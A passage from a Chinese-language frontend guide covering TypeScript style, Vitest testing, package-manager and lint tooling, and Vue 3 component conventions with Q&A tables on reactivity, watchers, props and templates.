  <span class="hljs-keyword">return</span> date.<span class="hljs-title function_">toISOString</span>()
}
</code></pre>
<h4 data-id="heading-4">TypeScript 最佳实践</h4>
<p><strong>显式返回类型</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// ❌ 避免：隐式返回类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateTotal</span>(<span class="hljs-params">items</span>) {
  <span class="hljs-keyword">return</span> items.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, item</span>) =&gt;</span> sum + item.<span class="hljs-property">price</span>, <span class="hljs-number">0</span>)
}

<span class="hljs-comment">// ✅ 推荐：显式返回类型</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">calculateTotal</span>(<span class="hljs-params">items: Item[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> items.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, item</span>) =&gt;</span> sum + item.<span class="hljs-property">price</span>, <span class="hljs-number">0</span>)
}

<span class="hljs-comment">// ✅ 复杂类型提取为类型别名</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">AsyncResult</span>&lt;T&gt; = <span class="hljs-title class_">Promise</span>&lt;{ <span class="hljs-attr">data</span>: T; <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> } | { <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>; <span class="hljs-attr">error</span>: <span class="hljs-title class_">Error</span> }&gt;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> fetchData&lt;T&gt;(<span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">AsyncResult</span>&lt;T&gt; {
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<p><strong>避免复杂内联类型</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// ❌ 避免：复杂内联类型</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">processUsers</span>(<span class="hljs-params">
  users: <span class="hljs-built_in">Array</span>&lt;{
    id: <span class="hljs-built_in">string</span>
    profile: {
      name: <span class="hljs-built_in">string</span>
      email: <span class="hljs-built_in">string</span>
      settings: {
        theme: <span class="hljs-string">'light'</span> | <span class="hljs-string">'dark'</span>
        notifications: <span class="hljs-built_in">boolean</span>
      }
    }
  }&gt;
</span>) {
  <span class="hljs-comment">// ...</span>
}

<span class="hljs-comment">// ✅ 推荐：提取类型定义</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserSettings</span> {
  <span class="hljs-attr">theme</span>: <span class="hljs-string">'light'</span> | <span class="hljs-string">'dark'</span>
  <span class="hljs-attr">notifications</span>: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserProfile</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">settings</span>: <span class="hljs-title class_">UserSettings</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">profile</span>: <span class="hljs-title class_">UserProfile</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">processUsers</span>(<span class="hljs-params">users: User[]</span>) {
  <span class="hljs-comment">// ...</span>
}
</code></pre>
<h4 data-id="heading-5">注释哲学</h4>
<p><strong>解释"为什么"而非"怎么做"</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// ❌ 避免：无意义的注释</span>
<span class="hljs-comment">// 循环遍历用户数组</span>
users.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> {
  <span class="hljs-comment">// 打印用户名</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>)
})

<span class="hljs-comment">// ✅ 推荐：解释为什么这样做</span>
<span class="hljs-comment">// 使用 setTimeout 0 延迟执行，确保 DOM 更新完成后再计算高度</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> height = element.<span class="hljs-property">offsetHeight</span>
}, <span class="hljs-number">0</span>)

<span class="hljs-comment">// ✅ 解释非直观的业务逻辑</span>
<span class="hljs-comment">// 价格计算需要先扣除折扣，再加税费，顺序不能颠倒</span>
<span class="hljs-comment">// 因为税费基于折后价计算（符合当地税法要求）</span>
<span class="hljs-keyword">const</span> finalPrice = (price - discount) * (<span class="hljs-number">1</span> + taxRate)
</code></pre>
<h4 data-id="heading-6">测试规范（Vitest）</h4>
<p><strong>文件组织</strong></p>
<pre><code class="hljs language-bash" lang="bash">src/
  utils/
    format.ts          <span class="hljs-comment"># 源代码</span>
    format.test.ts     <span class="hljs-comment"># 测试文件</span>
  components/
    Button.vue
    Button.test.ts
</code></pre>
<p><strong>测试结构</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// format.test.ts</span>
<span class="hljs-keyword">import</span> { describe, it, expect } <span class="hljs-keyword">from</span> <span class="hljs-string">'vitest'</span>
<span class="hljs-keyword">import</span> { formatCurrency, formatDate } <span class="hljs-keyword">from</span> <span class="hljs-string">'./format'</span>

<span class="hljs-title function_">describe</span>(<span class="hljs-string">'formatCurrency'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">it</span>(<span class="hljs-string">'should format USD correctly'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">expect</span>(<span class="hljs-title function_">formatCurrency</span>(<span class="hljs-number">1234.56</span>, <span class="hljs-string">'USD'</span>)).<span class="hljs-title function_">toBe</span>(<span class="hljs-string">'$1,234.56'</span>)
  })

  <span class="hljs-title function_">it</span>(<span class="hljs-string">'should handle zero'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">expect</span>(<span class="hljs-title function_">formatCurrency</span>(<span class="hljs-number">0</span>, <span class="hljs-string">'USD'</span>)).<span class="hljs-title function_">toBe</span>(<span class="hljs-string">'$0.00'</span>)
  })

  <span class="hljs-title function_">it</span>(<span class="hljs-string">'should round to 2 decimal places'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">expect</span>(<span class="hljs-title function_">formatCurrency</span>(<span class="hljs-number">1.234</span>, <span class="hljs-string">'USD'</span>)).<span class="hljs-title function_">toBe</span>(<span class="hljs-string">'$1.23'</span>)
  })
})

<span class="hljs-title function_">describe</span>(<span class="hljs-string">'formatDate'</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">it</span>(<span class="hljs-string">'should match snapshot'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">'2024-01-15T10:30:00Z'</span>)
    <span class="hljs-title function_">expect</span>(<span class="hljs-title function_">formatDate</span>(date)).<span class="hljs-title function_">toMatchSnapshot</span>()
  })
})
</code></pre>
<h4 data-id="heading-7">工具链速查</h4>
<h5 data-id="heading-8">@antfu/ni - 通用包管理器命令</h5>






















































<table><thead><tr><th>命令</th><th>npm</th><th>yarn</th><th>pnpm</th><th>bun</th></tr></thead><tbody><tr><td><code>ni</code></td><td><code>npm install</code></td><td><code>yarn install</code></td><td><code>pnpm install</code></td><td><code>bun install</code></td></tr><tr><td><code>nr dev</code></td><td><code>npm run dev</code></td><td><code>yarn run dev</code></td><td><code>pnpm run dev</code></td><td><code>bun run dev</code></td></tr><tr><td><code>nu</code></td><td><code>npm update</code></td><td><code>yarn upgrade</code></td><td><code>pnpm update</code></td><td><code>bun update</code></td></tr><tr><td><code>nun lodash</code></td><td><code>npm uninstall lodash</code></td><td><code>yarn remove lodash</code></td><td><code>pnpm remove lodash</code></td><td><code>bun remove lodash</code></td></tr><tr><td><code>nci</code></td><td><code>npm ci</code></td><td><code>yarn install --frozen-lockfile</code></td><td><code>pnpm install --frozen-lockfile</code></td><td><code>bun install --frozen-lockfile</code></td></tr><tr><td><code>nlx vitest</code></td><td><code>npx vitest</code></td><td><code>yarn dlx vitest</code></td><td><code>pnpm dlx vitest</code></td><td><code>bunx vitest</code></td></tr></tbody></table>
<h5 data-id="heading-9">TypeScript 配置标准</h5>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"target"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ESNext"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ESNext"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"moduleResolution"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"bundler"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lib"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"ESNext"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"DOM"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"DOM.Iterable"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"jsx"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"preserve"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"strict"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"skipLibCheck"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"resolveJsonModule"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"esModuleInterop"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"isolatedModules"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"noUncheckedIndexedAccess"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"paths"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"~/*"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"./src/*"</span><span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>关键配置说明：</strong></p>
<ul>
<li><code>moduleResolution: "bundler"</code> - 适配 Vite/Rollup 等现代打包工具</li>
<li><code>noUncheckedIndexedAccess: true</code> - 索引访问返回 <code>T | undefined</code>，更安全</li>
<li><code>strict: true</code> - 启用所有严格类型检查</li>
</ul>
<h5 data-id="heading-10">ESLint 配置</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装</span>
pnpm add -D @antfu/eslint-config eslint

<span class="hljs-comment"># 运行</span>
pnpm run lint --fix
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// eslint.config.js</span>
<span class="hljs-keyword">import</span> antfu <span class="hljs-keyword">from</span> <span class="hljs-string">'@antfu/eslint-config'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">antfu</span>({
  <span class="hljs-attr">vue</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">typescript</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">formatters</span>: {
    <span class="hljs-attr">css</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">html</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">markdown</span>: <span class="hljs-literal">true</span>,
  },
})
</code></pre>
<h5 data-id="heading-11">Git Hooks 配置</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装</span>
pnpm add -D simple-git-hooks lint-staged
</code></pre>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"simple-git-hooks"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"pre-commit"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"pnpm lint-staged"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"lint-staged"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"*.{js,ts,vue}"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eslint --fix"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h5 data-id="heading-12">pnpm Catalogs 最佳实践</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># pnpm-workspace.yaml</span>
<span class="hljs-attr">catalogs:</span>
  <span class="hljs-comment"># 生产依赖</span>
  <span class="hljs-attr">prod:</span>
    <span class="hljs-attr">vue:</span> <span class="hljs-string">^3.5.0</span>
    <span class="hljs-attr">pinia:</span> <span class="hljs-string">^2.2.0</span>
  
  <span class="hljs-comment"># 内联依赖（会被打包）</span>
  <span class="hljs-attr">inlined:</span>
    <span class="hljs-attr">lodash-es:</span> <span class="hljs-string">^4.17.21</span>
  
  <span class="hljs-comment"># 开发依赖</span>
  <span class="hljs-attr">dev:</span>
    <span class="hljs-attr">vitest:</span> <span class="hljs-string">^2.0.0</span>
    <span class="hljs-attr">typescript:</span> <span class="hljs-string">^5.6.0</span>
  
  <span class="hljs-comment"># 前端特定依赖</span>
  <span class="hljs-attr">frontend:</span>
    <span class="hljs-attr">unocss:</span> <span class="hljs-string">^0.63.0</span>
</code></pre>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json</span>
<span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"catalog:prod"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"lodash-es"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"catalog:inlined"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"vitest"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"catalog:dev"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"unocss"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"catalog:frontend"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-13">第二部分：Vue 3 核心规范</h3>
<blockquote>
<p>基于 Vue 3.5，优先使用 TypeScript 和 <code>&lt;script setup&gt;</code></p>
</blockquote>
<h4 data-id="heading-14">偏好设定</h4>



































<table><thead><tr><th>场景</th><th>推荐方案</th><th>原因</th></tr></thead><tbody><tr><td>语言选择</td><td>TypeScript</td><td>类型安全、更好的 IDE 支持</td></tr><tr><td>脚本格式</td><td><code>&lt;script setup lang="ts"&gt;</code></td><td>更简洁的语法、更好的性能</td></tr><tr><td>响应式选择</td><td><code>shallowRef</code> &gt; <code>ref</code></td><td>大多数场景足够用，性能更好</td></tr><tr><td>API 风格</td><td>Composition API</td><td>更好的逻辑复用和类型推导</td></tr><tr><td>Props 解构</td><td>❌ 不推荐</td><td>会丢失响应式</td></tr></tbody></table>
<h4 data-id="heading-15">标准组件模板</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup lang="ts"&gt;
import { computed, ref, watch, onMounted } from 'vue'
import type { ComponentPublicInstance } from 'vue'

// Props 定义
interface Props {
  title: string
  count?: number
  disabled?: boolean
}

const props = withDefaults(defineProps&lt;Props&gt;(), {
  count: 0,
  disabled: false,
})

// Emits 定义
interface Emits {
  update: [value: number]
  submit: [data: { name: string }]
}

const emit = defineEmits&lt;Emits&gt;()

// Model 双向绑定
const modelValue = defineModel&lt;string&gt;({ required: true })

// 响应式状态
const isLoading = ref(false)
const items = ref&lt;Item[]&gt;([])

// 计算属性
const displayTitle = computed(() =&gt; {
  return props.disabled ? `${props.title} (已禁用)` : props.title
})

// 侦听器
watch(() =&gt; props.count, (newVal, oldVal) =&gt; {
  console.log(`Count changed from ${oldVal} to ${newVal}`)
})

// 生命周期
onMounted(() =&gt; {
  console.log('Component mounted')
})

// 方法
function handleClick() {
  emit('update', props.count + 1)
}

// 暴露给父组件（defineExpose）
defineExpose({
  focus: () =&gt; {
    // 暴露的方法
  },
})
&lt;/script&gt;

&lt;template&gt;
  &lt;div&gt;
    &lt;h1&gt;{{ displayTitle }}&lt;/h1&gt;
    &lt;button @click="handleClick" :disabled="disabled"&gt;
      Count: {{ count }}
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;style scoped&gt;
/* scoped 样式 */
&lt;/style&gt;
</code></pre>
<h4 data-id="heading-16">关键导入速查</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 核心响应式 API</span>
<span class="hljs-keyword">import</span> {
  ref,           <span class="hljs-comment">// 深层响应式</span>
  shallowRef,    <span class="hljs-comment">// 浅层响应式（推荐）</span>
  reactive,      <span class="hljs-comment">// 深层响应式对象</span>
  shallowReactive, <span class="hljs-comment">// 浅层响应式对象</span>
  <span class="hljs-keyword">readonly</span>,      <span class="hljs-comment">// 只读代理</span>
  computed,      <span class="hljs-comment">// 计算属性</span>
  watch,         <span class="hljs-comment">// 侦听器</span>
  watchEffect,   <span class="hljs-comment">// 副作用侦听器</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// 生命周期钩子</span>
<span class="hljs-keyword">import</span> {
  onMounted,
  onUpdated,
  onUnmounted,
  onBeforeMount,
  onBeforeUpdate,
  onBeforeUnmount,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// 组件通信</span>
<span class="hljs-keyword">import</span> {
  defineProps,
  defineEmits,
  defineModel,
  defineExpose,
  defineSlots,
  provide,
  inject,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// 工具函数</span>
<span class="hljs-keyword">import</span> {
  nextTick,      <span class="hljs-comment">// 等待 DOM 更新</span>
  toRef,         <span class="hljs-comment">// 转换为 ref</span>
  toRefs,        <span class="hljs-comment">// 解构保持响应式</span>
  unref,         <span class="hljs-comment">// 解包 ref</span>
  isRef,         <span class="hljs-comment">// 判断是否 ref</span>
  markRaw,       <span class="hljs-comment">// 标记为非响应式</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// 类型工具</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {
  <span class="hljs-title class_">Ref</span>,
  <span class="hljs-title class_">ComputedRef</span>,
  <span class="hljs-title class_">ComponentPublicInstance</span>,
  <span class="hljs-title class_">PropType</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
</code></pre>
<h4 data-id="heading-17">ref vs shallowRef 性能对比</h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// ref - 深层响应式（递归代理所有层级）</span>
<span class="hljs-keyword">const</span> deepState = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">user</span>: {
    <span class="hljs-attr">profile</span>: {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'John'</span>,
      <span class="hljs-attr">settings</span>: {
        <span class="hljs-attr">theme</span>: <span class="hljs-string">'dark'</span>,
      },
    },
  },
})

<span class="hljs-comment">// 任何层级的修改都会触发响应</span>
deepState.<span class="hljs-property">value</span>.<span class="hljs-property">user</span>.<span class="hljs-property">profile</span>.<span class="hljs-property">settings</span>.<span class="hljs-property">theme</span> = <span class="hljs-string">'light'</span> <span class="hljs-comment">// ✅ 响应式</span>

<span class="hljs-comment">// shallowRef - 浅层响应式（只代理第一层）</span>
<span class="hljs-keyword">const</span> shallowState = <span class="hljs-title function_">shallowRef</span>({
  <span class="hljs-attr">user</span>: {
    <span class="hljs-attr">profile</span>: {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'John'</span>,
      <span class="hljs-attr">settings</span>: {
        <span class="hljs-attr">theme</span>: <span class="hljs-string">'dark'</span>,
      },
    },
  },
})

<span class="hljs-comment">// 只有整体替换才会触发响应</span>
shallowState.<span class="hljs-property">value</span>.<span class="hljs-property">user</span>.<span class="hljs-property">profile</span>.<span class="hljs-property">settings</span>.<span class="hljs-property">theme</span> = <span class="hljs-string">'light'</span> <span class="hljs-comment">// ❌ 不会触发</span>
shallowState.<span class="hljs-property">value</span> = { ...shallowState.<span class="hljs-property">value</span> } <span class="hljs-comment">// ✅ 触发响应</span>

<span class="hljs-comment">// 性能建议：大部分场景使用 shallowRef 足够</span>
</code></pre>
<hr/>
<h3 data-id="heading-18">第三部分：Vue 3 最佳实践与常见陷阱</h3>
<h4 data-id="heading-19">响应式系统</h4>

































<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>ref vs reactive 如何选择？</td><td>优先使用 <code>ref</code>。<code>ref</code> 可以存储任何类型，而 <code>reactive</code> 只能用于对象。<code>ref</code> 在重新赋值时保持响应性，<code>reactive</code> 不行。</td></tr><tr><td>什么时候用 shallowRef？</td><td>存储大型数据结构（如长列表、复杂嵌套对象）时，用 <code>shallowRef</code> 避免深层代理的性能开销。更新时需要整体替换对象。</td></tr><tr><td>如何阻止对象变成响应式？</td><td>使用 <code>markRaw()</code>。例如存储第三方库实例（Chart.js、Monaco Editor）时，避免不必要的代理。</td></tr><tr><td>多次修改 ref 会触发多次渲染吗？</td><td>不会。Vue 会将同一 tick 内的更新批量处理。如需立即看到 DOM 变化，使用 <code>await nextTick()</code>。</td></tr><tr><td>ref 解包规则是什么？</td><td>在模板中自动解包（<code>{{ count }}</code>）。在 <code>reactive</code> 对象中自动解包（<code>state.count</code>）。在数组和 Map/Set 中不解包（需要 <code>.value</code>）。</td></tr><tr><td>解构 props 会丢失响应性吗？</td><td>是的。使用 <code>toRefs(props)</code> 或 <code>toRef(props, 'key')</code> 保持响应性，或在 computed/watch 中访问 <code>props.xxx</code>。</td></tr></tbody></table>
<h4 data-id="heading-20">计算属性</h4>





























<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>计算属性可以有副作用吗？</td><td>不应该。计算属性应该是纯函数，只做计算和返回值。副作用应该放在 <code>watch</code> 或 <code>watchEffect</code> 中。</td></tr><tr><td>为什么计算属性是只读的？</td><td>默认只读，但可以提供 setter。推荐只读设计，修改应通过源数据。</td></tr><tr><td>计算属性什么时候重新计算？</td><td>只有当依赖的响应式数据变化时才重新计算（懒执行 + 缓存）。这是相比 <code>method</code> 的主要优势。</td></tr><tr><td>计算属性的条件依赖如何工作？</td><td>只追踪当前执行分支的依赖。<code>if (flag) return a</code> 时只追踪 <code>flag</code> 和 <code>a</code>，不追踪 <code>else</code> 分支。</td></tr><tr><td>计算属性内使用 array.map 有性能问题吗？</td><td>有。每次重新计算都会创建新数组。考虑使用 <code>shallowRef</code> 存储映射结果，或在 <code>watch</code> 中手动更新。</td></tr></tbody></table>
<h4 data-id="heading-21">侦听器</h4>

































<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>watch 的 getter 函数是什么？</td><td><code>watch(() =&gt; obj.count, ...)</code> 中的箭头函数。推荐用 getter 而非直接传对象，可以精确控制依赖。</td></tr><tr><td>deep: true 有性能问题吗？</td><td>有。深度侦听需要遍历对象的所有属性。只在必要时使用，或用 getter 函数精确指定依赖。</td></tr><tr><td>immediate: true 的执行时机是什么？</td><td>立即执行一次，此时 DOM 可能未挂载。需要访问 DOM 时注意判断。</td></tr><tr><td>flush 选项有什么区别？</td><td><code>pre</code>（默认）：DOM 更新前执行。<code>post</code>：DOM 更新后执行。<code>sync</code>：同步执行（避免使用）。</td></tr><tr><td>如何在侦听器中访问旧值？</td><td><code>watch(source, (newVal, oldVal) =&gt; {})</code>。注意对象类型的 <code>oldVal</code> 和 <code>newVal</code> 可能指向同一个引用。</td></tr><tr><td>watch vs watchEffect 如何选择？</td><td><code>watchEffect</code>：自动追踪依赖，简洁。<code>watch</code>：显式指定侦听源，可访问旧值，更精确。</td></tr></tbody></table>
<h4 data-id="heading-22">组件通信</h4>





























<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>可以修改 props 吗？</td><td>不可以。Props 是单向数据流，只读。需要修改时，emit 事件或使用 <code>defineModel</code>。</td></tr><tr><td>自定义事件会冒泡吗？</td><td>不会。Vue 的自定义事件不像原生 DOM 事件那样冒泡，只触发直接父组件的监听器。</td></tr><tr><td>组件名应该用什么格式？</td><td>PascalCase（<code>MyComponent.vue</code>）。在模板中可以用 <code>&lt;MyComponent&gt;</code> 或 <code>&lt;my-component&gt;</code>，推荐前者。</td></tr><tr><td>defineExpose 何时使用？</td><td>当需要父组件通过 ref 调用子组件方法时。默认 <code>&lt;script setup&gt;</code> 不暴露任何内容。</td></tr><tr><td>如何获取组件实例的类型？</td><td><code>InstanceType&lt;typeof MyComponent&gt;</code>，配合 <code>ref&lt;InstanceType&lt;typeof MyComponent&gt;&gt;()</code>。</td></tr></tbody></table>
<h4 data-id="heading-23">Props 与 Emits</h4>





























<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>Boolean props 的转换规则？</td><td><code>&lt;MyComp disabled&gt;</code> 等价于 <code>:disabled="true"</code>。<code>&lt;MyComp&gt;</code> 则是 <code>undefined</code>（除非有默认值）。</td></tr><tr><td>解构 props 会丢失响应性吗？</td><td>是的。<code>const { title } = defineProps()</code> 会丢失响应性。使用 <code>toRefs</code> 或直接访问 <code>props.title</code>。</td></tr><tr><td>props 命名约定是什么？</td><td>JS 中用 camelCase，HTML 中用 kebab-case。<code>defineProps&lt;{ userName: string }&gt;()</code> → <code>&lt;Comp user-name="John"&gt;</code>。</td></tr><tr><td>emit 事件命名约定？</td><td>JS 中用 camelCase，HTML 中用 kebab-case。<code>emit('updateValue')</code> → <code>@update-value="handler"</code>。</td></tr><tr><td>defineModel 的优势是什么？</td><td>简化 <code>v-model</code> 实现，自动生成 prop 和 emit。支持修饰符（<code>.trim</code>、<code>.number</code> 等）。</td></tr></tbody></table>
<h4 data-id="heading-24">模板语法</h4>





























<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>v-html 安全吗？</td><td>不安全。可能导致 XSS 攻击。只用于可信内容，或使用 DOMPurify 等库清理。</td></tr><tr><td>v-if 和 v-for 能同时用吗？</td><td>Vue 3 中 <code>v-if</code> 优先级高于 <code>v-for</code>，但不推荐同时使用。应该用 computed 过滤或嵌套 template。</td></tr><tr><td>v-if vs v-show 如何选择？</td><td><code>v-if</code>：条件渲染，切换开销高。<code>v-show</code>：CSS 切换，初始渲染开销高。频繁切换用 <code>v-show</code>。</td></tr><tr><td>key 的作用是什么？</td><td>帮助 Vue 识别节点，优化 diff 算法。列表渲染必须提供唯一 key，避免用 index。</td></tr><tr><td>如何绑定多个属性？</td><td><code>v-bind="attrs"</code> 可以一次性绑定对象的所有属性。例如 <code>v-bind="{ id: 'foo', class: 'bar' }"</code>。</td></tr></tbody></table>
<h4 data-id="heading-25">表单与 v-model</h4>

























<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>defineModel 的修饰符如何使用？</td><td>内置 <code>.trim</code>、<code>.number</code>、<code>.lazy</code>。自定义修饰符通过 <code>defineModel</code> 的第二个参数处理。</td></tr><tr><td>v-model 在组件上的原理？</td><td>语法糖：<code>:modelValue="value" @update:modelValue="value = $event"</code>。多个 v-model：<code>v-model:title</code>。</td></tr><tr><td>如何在 v-model 更新后访问 DOM？</td><td>使用 <code>await nextTick()</code>，因为 Vue 异步更新 DOM。</td></tr><tr><td>textarea 的 v-model 和插值的区别？</td><td><code>&lt;textarea v-model="text"&gt;</code> 正确。<code>&lt;textarea&gt;{{ text }}&lt;/textarea&gt;</code> 不生效，textarea 不支持插值。</td></tr></tbody></table>
<h4 data-id="heading-26">事件处理与修饰符</h4>

























<table><thead><tr><th>问题</th><th>建议</th></tr></thead><tbody><tr><td>.once 修饰符如何工作？</td><td>事件只触发一次后自动移除监听器。<code>@click.once="handler"</code>。</td></tr><tr><td>.exact 修饰符的作用？</td><td>精确匹配修饰键。<code>@click.ctrl.exact</code> 只在按下 Ctrl（无其他键）时触发。</td></tr><tr><td>.passive 和 .prevent 冲突吗？</td><td>冲突。<code>.passive</code> 告诉浏览器不调用 <code>preventDefault()</code>，两者不能同时使用。</td></tr><tr><td>自定义事件可以用修饰符吗？</td><td>可以，但需要在子组件中通过 <code>defineEmits</code> 的第二个参数手动实现验证逻辑。</td></tr></tbody></table>
<h4 data-id="heading-27">生命周期</h4>





















